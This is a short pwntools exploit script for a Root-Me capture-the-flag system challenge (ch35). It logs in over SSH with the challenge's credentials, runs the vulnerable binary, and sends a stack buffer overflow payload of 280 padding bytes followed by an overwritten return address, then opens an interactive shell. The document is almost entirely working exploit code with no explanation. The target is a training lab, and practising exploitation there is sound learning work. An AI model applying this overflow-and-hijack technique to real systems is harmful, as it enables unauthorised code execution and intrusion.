# pwning
from pwn import *
p = ssh(host='challenge03.root-me.org',user='app-systeme-ch35',password='app-systeme-ch35',port=2223)
print p['ls']
ch13=p.process('./ch35')

ch13.sendline('A'*280 + '\xcd\x06\x40\x00\x00\x00\x00\x00')
ch13.interactive()
